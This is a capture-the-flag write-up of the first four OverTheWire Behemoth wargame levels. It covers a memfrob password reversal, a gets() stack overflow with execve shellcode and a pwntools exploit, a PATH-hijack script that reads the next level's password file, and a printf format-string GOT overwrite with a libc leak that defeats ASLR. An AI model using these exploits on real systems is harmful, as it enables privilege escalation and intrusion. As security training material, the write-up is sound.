---
title: OverTheWire Behemoth - Challenges 1-8 - Reversing and Linux System Exploitation
date: 2022-02-01
categories:
    - pwn
    - Reversing
tags:
    - overthewire Behemoth
    - printf format exploit
    - shellcode
    - ASLR bypass
toc: true
---

The challenges can be found at https://overthewire.org/wargames/behemoth/ in a standard format for ctf wargames: Each challenge is accessed via a different user on a remote machine.

Code for all my solutions can be found at my [GitHub](https://github.com/saardr)

 The first challenge is accessed by sshing into `behemoth0@behemoth.labs.overthewire.org` over port 2221 with password `behemoth0`. in one command:

`ssh behemoth0@behemoth.labs.overthewire.org -p 2221` and entering behemoth0 as the password when asked to.

The challenges can be found at /behemoth. The passwords for each user can be found at /etc/behemoth_pass.

## Challenge 1 - Getting started:

In this challenge we are given a simple a Fairly simple binary.

When we try running it we get:

![Behemoth0-run-attempt](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth0-run-attempt.png)

Let's try disassembling the binary to understand it better.

We can copy the binary to our local machine using [scp](https://linux.die.net/man/1/scp):

'scp -P2221 behemoth0@behemoth.labs.overthewire.org:/behemoth/behemoth0' and enter the password when requested.

I'll be using both [IDA freeware](https://hex-rays.com/ida-free/) and [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases) (for the decompiler mostly, as there is not x86 decompile with IDA free) in these challenges, you can any other reversing tool of your choice, but I would strongly urge against using just gdb as challenges get more difficult to reverse.

![Behemoth0-reversing-graph](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth0-reversing-graph.png)

The program asks for a password, and it then reads 64 bytes from the user using scanf. Since it reads them into ebp-0x5d it seems a buffer overflow is out of the question this time.

It then reads the length of the password entered by the user using strlen followed by a call: `memfrob(ebp-0x1C, strlen(user_input))`

From the man pages:

> The memfrob() function encrypts the first n bytes of the memory
> area s by exclusive-ORing each character with the number 42

seems simple enough. when we look at what is stored at ebp-0x1C we see 3 values:

475E4B4Fh 45425953h 595E58h

we can think of these 3 numbers as a byte sequence of length 11, which after xoring with 42 ends up as:

mtae ohsy '\0'str, However, we need to remember that linux x86 is little endian, meaning the LSB is stored first and the most significant Byte is last. This means we need to reverse each 4 letter block and ignore the null byte which represents the string's end in C. We end up with:

__`eatmyshorts`__

we enter the password and get a shell!

![Behemoth0-win](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth0-win.png)

## Challenge 2 - Classic Ret2Buf BufferOverflow:

again we ssh into the machine and run the binary, we get a similar result as in challenge 1. 

![Behemoth1-run-attempt](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth1-run-attempt.png)

Let us download the binary once more and disassemble it:

![Behemoth1-reversing-graph](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth1-reversing-graph.png)

Immediatly the call to gets() pops out. from man:

> Never use this function.

> gets() reads a line from stdin into the buffer pointed to by s
> until either a terminating newline or EOF, which it replaces with
> a null byte ('\0').  No check for buffer overrun is performed
> (see BUGS below).

> Never use gets(). Because it is impossible to tell without
> knowing the data in advance how many characters gets() will read,
> and because gets() will continue to store characters past the end
> of the buffer, it is extremely dangerous to use.  It has been
> used to break computer security.  Use fgets() instead.

We can use gets to overwrite our buffer and cause a buffer overflow!

I won't go into details about buffer overflows and the structure of the stack as i feel it is too deep to cover in such a short text, however, i very highly reccommend watching liveoverflow's [series on youtube](https://youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN), if you are not already familiar with it.

First, some reconnaissance about the binary and the system its running on.

`cat /proc/sys/kernel/randomize_va_space` tells us whether the system has [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) enabled or not, since the result is 0, there is no ASLR.

What is ASLR? for our purposes - "ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries" - wikepedia. essentialy aslr makes it much much harder to fully exploit a program after we control the return pointer, since its not clear where to return to.

Let us also run [checksec](https://github.com/slimm609/checksec.sh) (to install: `sudo apt install checksec`) which tells us more about the binary's protections: 

![Behemoth1-checksec](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth1-checksec.png)

Most importantly the binary does not have a [NX bit](https://en.wikipedia.org/wiki/NX_bit) set. tl;dr - if NX is set, then writable addresses in memory, in our case most importantly the process stack, can't run code - specifically shellcode. Since it is disabled, we can write and run shellcode on the stack which is exactly what we are going to do. also important, the binary does not have a [stack canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries). Combining this with the fact the system has no ASLR, makes for a pretty simple exploit plan:

1. we overflow the buffer with shellcode of our choice, 64 bytes is plenty for that.
2. we overwrite the return address on the stack with the address of the buffer in the stack (as we can tell in IDA, ebp - 0x43, in more detail soon) which will casue the program to return to the buffer on the stack.
3. the shellcode executes and we win :)

But how can we know the stack address ahead of time? Since the system has no ASLR, everytime we run the program the stack is going to be in the exact same memory address. To find said addresses we can simply use gdb and check what is the value of eax just before the call to gets().

To find out that address, lets load the program in gdb:

`gdb behemoth1` followed by `set disassembly-flavor intel` to use intel syntax (like IDA) instead of GAS. `disassemble main`:

![Behemoth1-gdb-disasMain](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth1-gdb-disasMain.png)

we break at the call to gets by typing `break *0x08048456`, followed by running the program, we then check eax: info register eax or `i r eax` which results in 0xffffd625. just to make sure, lets type some letters, i.e. AAAABBBBCCCC and break at the return to check if we got it right:

after doing so, examine string at 0xffffd625, i.e. `x/s 0xffffd625` (this time no astrick) and see if we get our string:

![Behemoth1-gdb-output](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth1-gdb-output.png)

Nice! now lets get to writing our shellcode:

```assembly
section .text

global _start
_start:
  push 0x0068732f ; '/sh'
  push 0x6e69622f ; '/bin'
  ; now '/bin/sh' is at esp
  mov ebx, esp    ; now ebx points to '/bin/sh'
  xor ecx, ecx
  xor edx, edx
  mov eax, 11     ; execve syscall
  int  0x80
```

This shellcode pushes the string '/bin/sh' into the stack similarly to the way challenge 1 stored the string 'eatmyshorts'.

It then makes a call to the execve syscall:

> ```c
> #include <unistd.h>
> 
> int execve(const char *pathname, char *const argv[],
>                   char *const envp[]);
> ```

> execve() executes the program referred to by pathname.  This
> causes the program that is currently being run by the calling
> process to be replaced with a new program, with newly initialized
> stack, heap, and (initialized and uninitialized) data segments.

the linux-x86 calling convention for syscall is:

1. syscall number - eax, can be easily checked online [here](https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md#x86-32_bit) for instance
2. arg1 - ebx, arg2 - ecx, arg3 - edx. Further args are also availble but irrelevant to us. 

we compile the shellcode with `nasm -f elf shellcode.asm` which gets us `shellcode.o`,we then link the file with `ld shellcode.o -o shellcode` on a x86 linux machine, or `ld -m elf_i386 shellcode.o -o shellcode` on a x64 machine like the one in Behemoth.

We can then extract the shellcode from the binary by calling `objdump -d shellcode` (the shellcode is inside the red rectangle):

![Behemoth1-shellcodeHex](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth1-shellcodeHex.png)

Copy the bytes into a python string (or whatever other language you want to use) be prepending \x before every byte in the string. i.e. the shellcode in python form is 

``` python
shellcode = b''.join([b"\x68\x2f\x73\x68\x00", 
                    b"\x68\x2f\x62\x69\x6e",
                    b"\x89\xe3",
                    b"\x31\xc9",
                    b"\x31\xd2",
                    b"\xb8\x0b\x00\x00\x00",
                    b"\xcd\x80"])
```

__Important:__ please note that gets() accepts null bytes without trouble which is why the shellcode is fine, other methods of input may not do so however. One way to work around that in this instance, would be to replace `mov eax, 11` with

```assembly
xor eax, eax
xor eax, 11
```

 to avoid null bytes in the shellcode. (feel free to compile and check for yourselves)

Although the base address of the stack won't change, some other information such as the working directory or other environment variables can change by us by mistake, to compensate for that, we can pad the buffer with `NOP (0x90)` instructions, which do nothing. that way if we accidently land in `buffer[20]` instead of `buffer[0]` we will still be find, as we will just slide in the nopslide until we hit our shellcode:

```assembly
0: 0x90 ;	NOP
1: 0x90 ;	NOP
...
64-len(shellcode)-1: 0x90 ; NOP
64-len(shellcode):	 0x68 ;	start of shellcode
...
63: 0x80									; end of shellcode
```

Finally, the exploit script - I'll be using the [pwntools](https://docs.pwntools.com/en/stable/) package, which makes things such as formatting and IO much less of a hassle to deal with.

```python
from pwn import *

io = process("/behemoth/behemoth1")

shellcode = b''.join([b"\x68\x2f\x73\x68\x00", 
                    b"\x68\x2f\x62\x69\x6e",
                    b"\x89\xe3",
                    b"\x31\xc9",
                    b"\x31\xd2",
                    b"\xb8\x0b\x00\x00\x00",
                    b"\xcd\x80"])

debug_shellcode = b"\xCC"*4

#shellcode = debug_shellcode

buffer_len = 0x43
NOP = b'\x90'
padding = NOP*(buffer_len-len(shellcode))+shellcode
ebp = b"B"*4

stack_address = p32(0xffffd625+0x10) # pack the 32-bit number as a string in little endian format.

exploit = padding + ebp + stack_address
# print exploit
io.recv(timeout=0.1)

io.sendline(exploit)
io.interactive()
```

__Troubleshooting__ - even after doing all the steps, since we are dealing with a very small margin of error, the exploit might still not work. So how do we solve this?

1. please note the addition of +0x10 to make it more likely for us to land in the buffer.
2. debug with gdb again to make sure the value in eax hasn't changed (for instance because you have logged our from the server and reconnected)
3. If you want to debug your shellcode, you can replace the first byte with `\xCC` which is the opcode for a breakpoint interrupt.
4. it may also be useful to print the exploit into a file before running the pwntools utilities, to debug with gdb simply by typing `r < YourFileName`
5. Just keep playing around with the values, eventually you are going to hit the buffer and get code execution.

We run our exploit:

![Behemoth1-win](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth1-win.png)

We win! :)

## Challenge 3 - $PATH System() exploit:

Once again, lets start by trying to simplty run the program. we get:

![Behemoth2-run-attempt](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth2-run-attempt.png)

This seems a bit weird, lets try to reverse the program and see where we end up, The main code is made of 3 chunks. the first:

![Behemoth2-reversing1](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth2-reversing1.png)

we see what looks like a pretty long prologue, followed by a call to `getpid()`.

The value from `getpid()` than gets stores as `var_C`, followed by a call to `sprintf` which prints a formatted string into a buffer. the formatted string is `touch %d` and since the pid is being pushed as a parameter, we can conclude that [ebp+var_24] -> "touch {current_pid}".

Then a call `lstat(ebp+var_88, [ebp+var_10])` is made but if we look a bit above we see the instructions

```assembly
lea eax, [ebp+var_24]
add eax, 6
mov [ebp+var_10], eax
```

make it so that `[ebp+var_10] -> but[6]` which is just where `str(pid)` starts.

After reading about lstat for a bit, as well as using basic intuition, we can tell lstat is being used here to check if a file name {curr_pid} exists, if it does, eax will contain the value 0. else, eax will contain the value -1. nontheless, a & 0xF000 = 0 or 0xF000 != 0x8000 hence the jump won't occur and we go to the second block. 

![Behemoth2-reversing2](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth2-reversing2.png)

we then call unlink depending on the results of the previous call, followed by setting the real user id, from this point on, if we get code execution we win.

We then make a call to `system("touch {curr_pid}")`. then the last block

![Behemoth2-reversing3](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth2-reversing3.png)

opens with a call to `sleep(2000)` which tells to program to sleep for 2000 seconds. This is probably a sign of one of two things:

1. There is some sort of a race condition - unlikely.
2. We should have exploited the program by now - more likely.

So we know we should exploit the code before the third block, but only after the call to `setreuid()`. That just leaves the call to `system("touch {curr_pid}")`.

A good habit when exploiting linux programs with calls to `system()` is to check for working directory and path vulnerabilities. And indeed this is the case here! System doesn't specify the full path to touch, so if prepend our own directory to the $PATH environment variable, and we make it so it contains an executable named touch we can control execution!

Let us then create the following bash file in a directory of our choice in tmp:

```bash
#!/bin/sh
cat /etc/behemoth_pass/behemoth3
```

we then `chmod 777 ./touch` which makes it executable by all users on the system, including Behemoth3.

Lastly we do `export PATH=$(pwd):$PATH` which prepends the current directory to $PATH __before__ /usr/bin (which is where touch is). 

![Behemoth2-win](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth2-win.png)

We win! :)

## Challenge 4 - Exploiting printf format with ASLR enabled:

This was by far the hardest challenge in my opinion as far as exploitation goes. However, before solving it, i decided i wanted to try making it harder and more realistic. How? __By making the exploit work on my ubuntu 18.04 WITH ASLR__ as well as on the remote behemoth machine, in such a manner that ASLR won't affect it.

First, lets login and run the binary to see what happens:

![Behemoth3-run-attempt](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth3-run-attempt.png)

indeed we have a printf format exploit. Nontheless, lets reverse the binary:

![Behemoth3-reversing](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth3-reversing.png)

The program reads 0xC8 = 200 bytes from the user as input, and then prints the input using printf. (instead of puts! simply using puts() would make all problems go away). This is a classic printf format, however exploiting this with ASLR is a lot trickier than it seems.

The most natural way way to proceed would be to just overwrite puts@.got.plt (the binary has no RELRO, simply run checksec on in like in challenge 2). Full RELRO, would mean the entire .plt and .got sections of the code will be read-only hence eliminating any possiblity of overwriting any parts of it.

However, what do we write instead of puts? we can't ret2libc (yet) because of ASLR. Solution:

### Plan to Leak __libc_start_main & Ret2libc:

1. use printf format to overwrite puts@.got.plt with main(), i.e. `0x080847B` (to see addresses in IDA, go to options -> general -> line prefex (graph), or hit <spacebar> to enter text mode).
2. Leak the return address of main: main() is called by __libc_start_main, which, unsurprisingly, is in libc, if we know the libc version the code is running in, we can use that known address, and the known offset to find the base of libc! The return address is on the stack therefore can be leaked by printf.
3. execution proceeds and we return back to the start of main
4. repeat the exploit from stage (1), but this time instead of writing the base of main, write some gadget in libc, or just system@libc and think what to do from there.

First, lets find what parameter to printf is the return address. This can be done either by reading the disassembly or debugging, in my opinion, usually debugging, especially with a tool like [pwndbg](https://github.com/pwndbg/pwndbg) is far easier, but here the disassembly is manageable as well.

When entering main, the return address is at the top of the stack. Then the previous ebp is pushed and ebp starts pointing to it. so the return address is at ebp+4 (the stack grows towards lower addresses). then `sub esp, 0xc8` makes it so esp -> buf on the stack.

When we get to the last printf call (the one where the string printed is in our control), esp ->  ebp-0xC8-4 -> ebp-0xC8 = "user input"

That means there are 4 - (-0xC8) = 0xCC bytes between the first parameter (including) to the return address (not including), hence there are xCC/4 = 51 parameters before the return address -> __The return address is the 52nd parameter to printf__. Verifying the conclusion in pwndbg:

To print the n'th argument to printf we can use %n$p: the n$ specifies it's the n'th argument while p is for pointer. in our case, %52$p. we plug it as input in gdb, and compare that to `[ebp+4]` which we know is the return address. Indeed it is the 52nd argument:

![Behemoth3-gdb-verifying-52](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth3-gdb-verifying-52.png)

__Important__: Also, it is important to follow execution into __libc_start_main as it can be uncertain to what point in libc_start_main the code returns:

![Behemoth3-libc_start_main](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth3-libc_start_main.png)

we see that the code returns to __libc_start_main+241 (on my local machine's libc, it is 246 on the server). so if we know the return address then:

`Base_Of_Libc = return_address - 241 - __libc_start_main_offset_in_libc`

Pwntools does handle that for us, and i will make use of that later on, but this can all be done by hand as well, by using `readelf -s /lib32/libc.so.6` to find the offset of __libc_start_main in libc.

So, now that we have the return address, we need to overwrite puts@.got.plt to return to main. We can easily find that address using IDA, by clicking on _puts in main:

<img src="/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth3-IDA-plt.png" alt="Behemoth3-IDA-plt" style="zoom:50%;" />

and when we click on off_80497AC we indeed get into the .got.plt section:

<img src="/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth3-IDA-got_plt.png" alt="Behemoth3-IDA-got_plt" style="zoom:50%;" />

So `0x080497AC` is the address we are going to overwrite, with `0x080847B`(main). In order to overwrite it with said value we are going to need to use %n, but since we can't write `0x080847B` bytes to screen, we instead are going to be overwriting the lower 2 bytes and upper 2 bytes of `puts@.got.plt` separately. To get enough padding for writing we can use %kx where k is a number, to prepend the hex number with spaces such that cnt(spaces) + Len(hex_num) = k. If we follow that with %n then we will write k + cnt(whatever came before %kx) to the target.

__Note__: target also needs to be an arg to printf, hence needs to be on the stack, meaning inside our string. 

To conclude, here is the function that builds the exploit string for stage (1):

```python
puts_got_plt = 0x080497AC
printf_got_plt = 0x080497A4
main_addr = 0x0804847B

def get_eip_control(overwrite_addr, ret_addr, is_second = False):
	''' overwrite ret_addr with overwrite_addr. 
			n0 = ammount written before first  write (to lower bytes)
			n1 = ammount needed to be written to lower bytes
  		n2 = ammount needed to be written to hight bytes'''
  exploit  = p32(overwrite_addr) 									# first write to LSB
  exploit += p32(overwrite_addr+2)								# than MSB

  n0 = len(exploit)		 									  				# n0 will represent the ammount written thus far.
  if is_second:
    n0 -= 1            														# when debugging without this, i was off by 1
    																		  				# on the second payload. not entirely sure why though.
                       														# i placed the -1 here because it seemed the most natural.

  exploit += b" %52$p" 														# leak __libc_start_main
	# n1 = lower 2 bytes (less significant) of ret_addr
  n1 = u32(p32(ret_addr)[:2]+b"\x00\x00")	
  # the -11 is the address of __libc_start_main and the space before it. because len(" 0xXXXXXXXX") = 11
  exploit += ("%{}x".format(n1 - n0 - 11)).encode() 
  exploit += b"%1$n"
  n2 = u32(p32(ret_addr)[2:]+b"\x00\x00")					# n2 = upper 2 bytes (more significant) of ret_addr
  
  # if we had already written too much characters.
  if n2 < n1:
    # overflow the 2 bytes we are going to write to.
    # since they are just 2 bytes the 0x10000 is going to overflow
    # and be gone while the original n2 is going to be written.
    n2 = 0x10000 + n2	
  if n2 > n1:					# needed to avoid edge case where n1 == n2.
    exploit += ("%{}x".format(n2-n1)).encode()
    									# There is still an edge case where |n2-n1| < 8 and the %x
      								# is made of 8 digits but that is irrelevant here.
  exploit += b"%2$n"

  return exploit
```

Now for stage (2), we are going to need to run the program and extract the `__libc_start_main` address. The code that does that:

```python
outputs = []																								# handle all outputs for proper logging
outputs.append(io.recvuntil("yourself: "))									# first output from the program

exploit = get_eip_control(puts_got_plt, main_addr)
io.sendline(exploit)																				# deliever stage (1) of the exploit

# io.interactive() # left for debugging purposes
res = io.recvuntil(" 0x")

outputs.append(res)

if not args.NOASLR:																									
  __libc_start_main_246 = int(io.recv(8), 16)								# extract the address as int
  																													# from formatted output
  outputs.append(hex(__libc_start_main_246))
else:																												# enable for debugging
  __libc_start_main_246 = 0xf7e2a286

io.recvline() 																							# clear io buffer after printf
libc.address = 0																						# use pwntools built in offsets

# libc.address = 0xf7e12000																	# debug
libc.address = __libc_start_main_246-246-libc.sym.__libc_start_main
print("libc address is: " + hex(libc.address))
```

Last stage that is left is Stage (4). We still need to find a proper winning gadget. we can copy the libc used in the challenge to analyze it over scp. To find where it is at, type `ldd /behemoth/behemoth3` in the behemoth server.

At first i tried using and IDA [one_gadget](https://github.com/david942j/one_gadget) to find a no ground-work winning gadget, but as far as i am aware there are none. At this point i was about to settle for overwriting the return address and start doing rop chains since i control the stack, and after some rop-gadgets i should be able to have a good enough setup to return to libc. Maybe even rely solely on gadgets.

But then i came up with an idea that i think is the simplest solution! repeat the trick from last challenge here as well:

4. overwrite printf@.got.plt with system@libc
5. execution flows to puts which once again redirects us back to the start of main
6. At the start of main there is a call `printf("Identify yourself:")` but because we replaced printf with system it is now instead `system("Identify yourself:")`
7. Before starting the program: create an chmod 777 file Identify in a directory of my choice, add that directory to $PATH.
8. System calls the identify we created and we WIN!!!

The entire exploit, including ground-work, using pwntools-ssh to interact with Behemoth server, is in my [GitHub](https://github.com/saardr/overthewire-solutions/blob/main/behemoth/behemoth3/exp.py)

This is a 0 click solution to challenge 4 WITH ASLR, just install python3 and pwntools on your local linux machine and you're set.

![Behemoth3-win](/Users/saardrori/Library/Mobile Documents/com~apple~CloudDocs/Code/Projects/saardr.github.io/assets/images/OtwBehemoth/Behemoth3-win.gif)

## Challenge 5:

To be uploaded soon, along with challenges 6-7. Their Solutions are already up on github though.